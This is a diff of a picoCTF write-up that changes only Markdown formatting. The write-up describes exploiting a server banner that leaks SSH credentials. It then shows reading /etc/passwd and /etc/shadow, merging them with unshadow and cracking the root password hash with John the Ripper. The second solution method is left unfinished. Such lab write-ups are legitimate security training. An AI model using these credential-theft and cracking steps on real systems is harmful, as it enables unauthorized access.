@@ -1,4 +1,4 @@
-# Challege reads as follow 
+## Challege reads as follow 
 
 Can you abuse the banner?
 The server has been leaking some crucial information on 
@@ -7,11 +7,11 @@ tethys.picoctf.net 57019. Use the leaked information to get to the server.
 To connect to the running application use 
 nc tethys.picoctf.net 61514. From the above information abuse the machine and find the flag in the /root directory.
 
-# let's connect with first server and obtain the leaking information 
+## let's connect with first server and obtain the leaking information 
 
 upon connecting with leaking server, we got the following credentials:
 
-# nc ethys.picoctf.net 57019
+## nc ethys.picoctf.net 57019
 
 SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234 
 
@@ -33,12 +33,12 @@ John Draper
 
 player@challenge:~$ 
 
-# Now we're in .............. 
+## Now we're in .............. 
 
-# From here , I solved it in two ways. First as the questions suggests  the flag is in root folder. 
+## From here , I solved it in two ways. First as the questions suggests  the flag is in root folder. 
 let's check the permission of flag.txt 
 
-__________________________________________________________________________________
+**__________________________________________________________________________________
 player@challenge:/root$ ls -la 
 ls -la 
 total 16
@@ -49,7 +49,7 @@ drwxr-xr-x 1 root root   29 Apr 17 10:17 ..
 -rwx------ 1 root root   46 Mar  9 16:39 flag.txt
 -rw-r--r-- 1 root root 1317 Feb  7 17:25 script.py
 player@challenge:/root$  
-____________________________________________________________________________________
+____________________________________________________________________________________**
 
 As we can see, it you need root Privileges to read the file . 
 As I described above , I solved it in two ways. 
@@ -57,14 +57,14 @@ As I described above , I solved it in two ways.
 1. Crack the password of root  and enter as root to read the contents of the file 
 2. use the Hint provided and following along the way to solve it. 
 
-# Firstly am going to crack the password of root (First way)
+## Firstly am going to crack the password of root (First way)
 
 read users ( cat /etc/passwd)  and copy the root username and save it into a text file. 
-______________________________________________________________________________
+**______________________________________________________________________________
 player@challenge:/root$ cat /etc/passwd
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
-_______________________________________________________________________________
+_______________________________________________________________________________**
 
 Similary read the hash of passwords stored in /ect/shadow
 player@challenge:~$ cat /etc/shadow
@@ -79,11 +79,11 @@ unshadow name.txt password.txt > passwords.txt
 
 Now , you've merged file named as passwords. 
 
-# Did you hear about John ?
+## Did you hear about John ?
 NO, "John the Ripper is a powerful password cracking tool often used for security testing and analysis."
 
 Provide the path where John (Already Installed in Kali Linux) and the password file 
-_____________________________________________________________________________________________
+**_____________________________________________________________________________________________
 ┌──(user㉿kali)-[~/Desktop]
 └─$ john /usr/sbin/ password 
 Using default input encoding: UTF-8
@@ -99,11 +99,11 @@ Proceeding with wordlist:/usr/share/john/password.lst
 1g 0:00:00:01 DONE 2/3 (2024-04-16 21:07) 0.6211g/s 598.7p/s 598.7c/s 598.7C/s 123456..john
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
-__________________________________________________________________________________________
+__________________________________________________________________________________________**
 
 Oh , you did it buddy. "iloveyou" is the password of root. Switch to root and read the contents of the file. 
 
-# let's go for another way (second approach to solve it)
+## let's go for another way (second approach to solve it)
 
 I will continue it latter ................
 
